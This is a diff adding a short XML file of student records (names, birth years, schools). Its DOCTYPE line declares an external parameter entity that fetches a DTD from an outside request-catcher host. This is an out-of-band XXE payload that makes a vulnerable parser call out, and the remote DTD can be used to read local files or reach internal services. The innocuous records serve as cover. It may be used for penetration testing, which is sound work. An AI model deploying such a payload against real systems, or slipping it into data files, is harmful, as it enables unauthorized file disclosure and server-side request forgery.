@@ -1,0 +1,14 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "https://cuongcuc.free.beeceptor.com/xxe.dtd"> %xxe;]>
+<class>
+  <student>
+    <name> Pham Hoang </name>
+    <birth> 1999 </birth>
+    <school> HUST </school>
+  </student>
+  <student>
+    <name> Trung Quan </name>
+    <birth> 1998 </birth>
+    <school> PTIT </school>
+  </student>
+</class>
